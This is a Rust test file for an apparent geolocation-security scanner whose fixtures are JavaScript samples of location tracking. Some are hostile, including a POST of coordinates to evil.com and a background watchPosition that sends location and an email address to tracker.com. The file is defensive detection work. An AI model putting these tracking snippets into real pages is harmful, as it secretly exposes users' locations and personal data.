use super::*;

#[test]
fn empty_body_no_issues() {
    let issues = analyze_geolocation("", true);
    assert!(issues.is_empty());
}

#[test]
fn no_geolocation_no_issues() {
    let body = "var x = document.title;";
    let issues = analyze_geolocation(body, true);
    assert!(issues.is_empty());
}

#[test]
fn detects_get_current_position() {
    let body = "navigator.geolocation.getCurrentPosition(success);";
    let issues = analyze_geolocation(body, true);
    assert!(issues.contains(&GeolocationIssue::GeolocationApiUsed));
}

#[test]
fn detects_watch_position() {
    let body = "navigator.geolocation.watchPosition(update);";
    let issues = analyze_geolocation(body, true);
    assert!(issues.contains(&GeolocationIssue::WatchPositionUsed));
}

#[test]
fn detects_high_accuracy() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(success, error, {
            enableHighAccuracy: true
        });
    "#;
    let issues = analyze_geolocation(body, true);
    assert!(issues.contains(&GeolocationIssue::HighAccuracyEnabled));
}

#[test]
fn detects_geolocation_over_http() {
    let body = "navigator.geolocation.getCurrentPosition(success);";
    let issues = analyze_geolocation(body, false);
    assert!(issues.contains(&GeolocationIssue::GeolocationOverHttp));
}

#[test]
fn https_no_http_issue() {
    let body = "navigator.geolocation.getCurrentPosition(success);";
    let issues = analyze_geolocation(body, true);
    assert!(!issues.contains(&GeolocationIssue::GeolocationOverHttp));
}

#[test]
fn detects_position_exfiltration() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(function(pos) {
            var lat = pos.coords.latitude;
            var lng = pos.coords.longitude;
            fetch('/api/track', { body: JSON.stringify({lat, lng}) });
        });
    "#;
    let issues = analyze_geolocation(body, true);
    assert!(issues.contains(&GeolocationIssue::PositionDataSent));
}

#[test]
fn no_exfiltration_without_send() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(function(pos) {
            console.log(pos.coords.latitude);
        });
    "#;
    let issues = analyze_geolocation(body, true);
    assert!(!issues.contains(&GeolocationIssue::PositionDataSent));
}

#[test]
fn detects_no_error_handler() {
    let body = "navigator.geolocation.getCurrentPosition(success);";
    let issues = analyze_geolocation(body, true);
    assert!(issues.contains(&GeolocationIssue::NoErrorHandler));
}

#[test]
fn error_handler_present_no_issue() {
    let body =
        "navigator.geolocation.getCurrentPosition(success, function(err) { handleError(err); });";
    let issues = analyze_geolocation(body, true);
    assert!(!issues.contains(&GeolocationIssue::NoErrorHandler));
}

#[test]
fn severity_exfiltration_highest() {
    assert_eq!(
        geolocation_severity(&GeolocationIssue::PositionDataSent),
        7.0
    );
}

#[test]
fn severity_no_error_lowest() {
    assert_eq!(geolocation_severity(&GeolocationIssue::NoErrorHandler), 2.5);
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        GeolocationIssue::GeolocationApiUsed,
        GeolocationIssue::PositionDataSent,
    ];
    let mut seq = 0;
    let ops = geolocation_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(
        GeolocationIssue::GeolocationApiUsed.to_string(),
        "geolocation_used"
    );
    assert_eq!(
        GeolocationIssue::WatchPositionUsed.to_string(),
        "watch_position"
    );
    assert_eq!(
        GeolocationIssue::HighAccuracyEnabled.to_string(),
        "high_accuracy"
    );
    assert_eq!(
        GeolocationIssue::PositionDataSent.to_string(),
        "position_data_sent"
    );
    assert_eq!(
        GeolocationIssue::GeolocationOverHttp.to_string(),
        "geolocation_over_http"
    );
    assert_eq!(
        GeolocationIssue::NoErrorHandler.to_string(),
        "no_error_handler"
    );
}

#[test]
fn combined_issues() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(function(pos) {
            var lat = pos.coords.latitude;
            fetch('/track', {body: lat});
        });
        navigator.geolocation.watchPosition(update, null, {enableHighAccuracy: true});
    "#;
    let issues = analyze_geolocation(body, false);
    assert!(issues.contains(&GeolocationIssue::GeolocationApiUsed));
    assert!(issues.contains(&GeolocationIssue::WatchPositionUsed));
    assert!(issues.contains(&GeolocationIssue::HighAccuracyEnabled));
    assert!(issues.contains(&GeolocationIssue::PositionDataSent));
    assert!(issues.contains(&GeolocationIssue::GeolocationOverHttp));
}

// GeolocationSecurityIssue tests

#[test]
pub fn security_empty_body_no_issues() {
    let issues = analyze_geolocation_security("");
    assert!(issues.is_empty());
}

#[test]
pub fn security_no_keywords_no_issues() {
    let body = "var x = document.title; console.log('hello');";
    let issues = analyze_geolocation_security(body);
    assert!(issues.is_empty());
}

#[test]
pub fn detects_location_exfiltration() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(function(pos) {
            var lat = pos.coords.latitude;
            var lng = pos.coords.longitude;
            fetch('https://evil.com/track', {
                method: 'POST',
                body: JSON.stringify({lat, lng})
            });
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(issues.contains(&GeolocationSecurityIssue::LocationExfiltration));
}

#[test]
pub fn no_exfiltration_without_network_call() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(function(pos) {
            var lat = pos.coords.latitude;
            console.log(lat);
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(!issues.contains(&GeolocationSecurityIssue::LocationExfiltration));
}

#[test]
pub fn detects_continuous_tracking() {
    let body = r#"
        var watchId = navigator.geolocation.watchPosition(function(pos) {
            updateMap(pos);
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(issues.contains(&GeolocationSecurityIssue::ContinuousTracking));
}

#[test]
pub fn no_continuous_tracking_with_get_current_only() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(function(pos) {
            showLocation(pos);
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(!issues.contains(&GeolocationSecurityIssue::ContinuousTracking));
}

#[test]
pub fn detects_location_without_consent() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(function(pos) {
            displayMap(pos);
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(issues.contains(&GeolocationSecurityIssue::LocationWithoutConsent));
}

#[test]
pub fn no_consent_issue_with_confirmation() {
    let body = r#"
        if (confirm('Allow location access?')) {
            navigator.geolocation.getCurrentPosition(function(pos) {
                displayMap(pos);
            });
        }
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(!issues.contains(&GeolocationSecurityIssue::LocationWithoutConsent));
}

#[test]
pub fn no_consent_issue_with_permission_check() {
    let body = r#"
        navigator.permissions.query({name: 'geolocation'}).then(function(result) {
            if (result.state === 'granted') {
                navigator.geolocation.getCurrentPosition(showPosition);
            }
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(!issues.contains(&GeolocationSecurityIssue::LocationWithoutConsent));
}

#[test]
pub fn detects_high_accuracy_tracking() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(success, error, {
            enableHighAccuracy: true,
            maximumAge: 0
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(issues.contains(&GeolocationSecurityIssue::HighAccuracyTracking));
}

#[test]
pub fn no_high_accuracy_when_disabled() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(success, error, {
            enableHighAccuracy: false
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(!issues.contains(&GeolocationSecurityIssue::HighAccuracyTracking));
}

#[test]
pub fn detects_location_cross_origin() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(function(pos) {
            var coords = {lat: pos.coords.latitude, lng: pos.coords.longitude};
            window.parent.postMessage(coords, '*');
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(issues.contains(&GeolocationSecurityIssue::LocationCrossOrigin));
}

#[test]
pub fn no_cross_origin_without_post_message() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(function(pos) {
            var coords = {lat: pos.coords.latitude, lng: pos.coords.longitude};
            displayOnMap(coords);
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(!issues.contains(&GeolocationSecurityIssue::LocationCrossOrigin));
}

#[test]
pub fn detects_location_persistence() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(function(pos) {
            var location = {
                lat: pos.coords.latitude,
                lng: pos.coords.longitude
            };
            localStorage.setItem('userLocation', JSON.stringify(location));
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(issues.contains(&GeolocationSecurityIssue::LocationPersistence));
}

#[test]
pub fn detects_location_persistence_indexed_db() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(function(pos) {
            var db = indexedDB.open('locationDB', 1);
            db.onsuccess = function() {
                var transaction = db.result.transaction(['locations'], 'readwrite');
                var store = transaction.objectStore('locations');
                store.add({coords: pos.coords});
            };
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(issues.contains(&GeolocationSecurityIssue::LocationPersistence));
}

#[test]
pub fn no_persistence_without_storage() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(function(pos) {
            console.log(pos.coords.latitude);
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(!issues.contains(&GeolocationSecurityIssue::LocationPersistence));
}

#[test]
pub fn detects_location_fingerprinting() {
    let body = r#"
        var fingerprint = {
            userAgent: navigator.userAgent,
            screen: screen.width + 'x' + screen.height
        };
        navigator.geolocation.getCurrentPosition(function(pos) {
            fingerprint.location = pos.coords;
            sendFingerprint(fingerprint);
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(issues.contains(&GeolocationSecurityIssue::LocationFingerprinting));
}

#[test]
pub fn detects_location_fingerprinting_with_device_id() {
    let body = r#"
        var deviceId = navigator.userAgent + navigator.platform;
        navigator.geolocation.getCurrentPosition(function(pos) {
            track(deviceId, pos.coords.latitude, pos.coords.longitude);
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(issues.contains(&GeolocationSecurityIssue::LocationFingerprinting));
}

#[test]
pub fn no_fingerprinting_location_only() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(function(pos) {
            displayMap(pos.coords);
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(!issues.contains(&GeolocationSecurityIssue::LocationFingerprinting));
}

#[test]
pub fn detects_location_in_background() {
    let body = r#"
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                navigator.geolocation.watchPosition(trackInBackground);
            }
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(issues.contains(&GeolocationSecurityIssue::LocationInBackground));
}

#[test]
pub fn detects_location_in_background_with_hidden_check() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(function(pos) {
            if (!document.hidden) {
                updateUI(pos);
            }
            sendLocation(pos);
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(issues.contains(&GeolocationSecurityIssue::LocationInBackground));
}

#[test]
pub fn no_background_tracking_without_visibility_api() {
    let body = r#"
        navigator.geolocation.watchPosition(function(pos) {
            updateMap(pos);
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(!issues.contains(&GeolocationSecurityIssue::LocationInBackground));
}

#[test]
pub fn detects_location_with_sensitive_data() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(function(pos) {
            var data = {
                name: document.getElementById('username').value,
                email: document.getElementById('email').value,
                location: {lat: pos.coords.latitude, lng: pos.coords.longitude}
            };
            sendData(data);
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(issues.contains(&GeolocationSecurityIssue::LocationWithSensitiveData));
}

#[test]
pub fn detects_location_with_phone() {
    let body = r#"
        var phone = '+1234567890';
        navigator.geolocation.getCurrentPosition(function(pos) {
            register(phone, pos.coords);
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(issues.contains(&GeolocationSecurityIssue::LocationWithSensitiveData));
}

#[test]
pub fn no_sensitive_data_location_only() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(function(pos) {
            showMap(pos.coords.latitude, pos.coords.longitude);
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(!issues.contains(&GeolocationSecurityIssue::LocationWithSensitiveData));
}

#[test]
pub fn detects_geofencing_abuse() {
    let body = r#"
        navigator.geolocation.watchPosition(function(pos) {
            var distance = calculateDistance(pos.coords.latitude, pos.coords.longitude, targetLat, targetLng);
            if (distance < radius) {
                alertSecurity('User entered restricted zone');
            }
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(issues.contains(&GeolocationSecurityIssue::GeofencingAbuse));
}

#[test]
pub fn detects_geofencing_with_boundary() {
    let body = r#"
        function checkBoundary(lat, lng) {
            return lat > boundary.north && lat < boundary.south;
        }
        navigator.geolocation.getCurrentPosition(function(pos) {
            if (checkBoundary(pos.coords.latitude, pos.coords.longitude)) {
                triggerAlert();
            }
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(issues.contains(&GeolocationSecurityIssue::GeofencingAbuse));
}

#[test]
pub fn no_geofencing_without_boundary_logic() {
    let body = r#"
        navigator.geolocation.getCurrentPosition(function(pos) {
            displayMarker(pos.coords.latitude, pos.coords.longitude);
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(!issues.contains(&GeolocationSecurityIssue::GeofencingAbuse));
}

#[test]
pub fn security_display_variants() {
    assert_eq!(
        GeolocationSecurityIssue::LocationExfiltration.to_string(),
        "location_exfiltration"
    );
    assert_eq!(
        GeolocationSecurityIssue::ContinuousTracking.to_string(),
        "continuous_tracking"
    );
    assert_eq!(
        GeolocationSecurityIssue::LocationWithoutConsent.to_string(),
        "location_without_consent"
    );
    assert_eq!(
        GeolocationSecurityIssue::HighAccuracyTracking.to_string(),
        "high_accuracy_tracking"
    );
    assert_eq!(
        GeolocationSecurityIssue::LocationCrossOrigin.to_string(),
        "location_cross_origin"
    );
    assert_eq!(
        GeolocationSecurityIssue::LocationPersistence.to_string(),
        "location_persistence"
    );
    assert_eq!(
        GeolocationSecurityIssue::LocationFingerprinting.to_string(),
        "location_fingerprinting"
    );
    assert_eq!(
        GeolocationSecurityIssue::LocationInBackground.to_string(),
        "location_in_background"
    );
    assert_eq!(
        GeolocationSecurityIssue::LocationWithSensitiveData.to_string(),
        "location_with_sensitive_data"
    );
    assert_eq!(
        GeolocationSecurityIssue::GeofencingAbuse.to_string(),
        "geofencing_abuse"
    );
}

#[test]
pub fn security_severity_highest() {
    assert_eq!(
        geolocation_security_severity(&GeolocationSecurityIssue::LocationExfiltration),
        9.0
    );
}

#[test]
pub fn security_severity_lowest() {
    assert_eq!(
        geolocation_security_severity(&GeolocationSecurityIssue::LocationWithoutConsent),
        3.0
    );
}

#[test]
pub fn security_severity_all_in_range() {
    let variants = vec![
        GeolocationSecurityIssue::LocationExfiltration,
        GeolocationSecurityIssue::ContinuousTracking,
        GeolocationSecurityIssue::LocationWithoutConsent,
        GeolocationSecurityIssue::HighAccuracyTracking,
        GeolocationSecurityIssue::LocationCrossOrigin,
        GeolocationSecurityIssue::LocationPersistence,
        GeolocationSecurityIssue::LocationFingerprinting,
        GeolocationSecurityIssue::LocationInBackground,
        GeolocationSecurityIssue::LocationWithSensitiveData,
        GeolocationSecurityIssue::GeofencingAbuse,
    ];
    for variant in variants {
        let severity = geolocation_security_severity(&variant);
        assert!(severity >= 3.0 && severity <= 9.0);
    }
}

#[test]
pub fn security_to_operations_creates_entries() {
    let issues = vec![
        GeolocationSecurityIssue::LocationExfiltration,
        GeolocationSecurityIssue::ContinuousTracking,
        GeolocationSecurityIssue::LocationFingerprinting,
    ];
    let mut seq = 0;
    let ops = geolocation_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 3);
}

#[test]
pub fn security_empty_issues_empty_operations() {
    let issues: Vec<GeolocationSecurityIssue> = vec![];
    let mut seq = 0;
    let ops = geolocation_security_to_operations(&issues, &mut seq);
    assert!(ops.is_empty());
    assert_eq!(seq, 0);
}

#[test]
pub fn security_combined_multiple_issues() {
    let body = r#"
        var userEmail = 'user@example.com';
        document.addEventListener('visibilitychange', function() {
            navigator.geolocation.watchPosition(function(pos) {
                var location = {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    email: userEmail
                };
                localStorage.setItem('tracking', JSON.stringify(location));
                fetch('https://tracker.com/log', {
                    method: 'POST',
                    body: JSON.stringify(location)
                });
            }, null, {enableHighAccuracy: true});
        });
    "#;
    let issues = analyze_geolocation_security(body);
    assert!(issues.contains(&GeolocationSecurityIssue::LocationExfiltration));
    assert!(issues.contains(&GeolocationSecurityIssue::ContinuousTracking));
    assert!(issues.contains(&GeolocationSecurityIssue::HighAccuracyTracking));
    assert!(issues.contains(&GeolocationSecurityIssue::LocationPersistence));
    assert!(issues.contains(&GeolocationSecurityIssue::LocationInBackground));
    assert!(issues.contains(&GeolocationSecurityIssue::LocationWithSensitiveData));
}
